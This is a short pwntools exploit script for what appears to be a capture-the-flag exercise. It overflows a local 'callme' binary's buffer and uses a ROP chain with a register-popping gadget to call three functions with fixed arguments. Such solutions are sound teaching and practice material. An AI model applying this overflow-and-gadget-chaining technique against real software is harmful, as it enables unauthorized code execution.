#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./callme")
p = process(elf.path)

POP_RDI_RSI_RDX = p64(0x000000000040093c) # pop rdi ; pop rsi ; pop rdx ; ret

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

callme1 = p64(elf.symbols["callme_one"])
callme2 = p64(elf.symbols["callme_two"])
callme3 = p64(elf.symbols["callme_three"])

payload = b"A" * 0x28 # buffer + rbp
payload += POP_RDI_RSI_RDX
payload += arg1 + arg2 + arg3 + callme1
payload += POP_RDI_RSI_RDX
payload += arg1 + arg2 + arg3 + callme2
payload += POP_RDI_RSI_RDX
payload += arg1 + arg2 + arg3 + callme3

p.sendline(payload)
p.interactive()
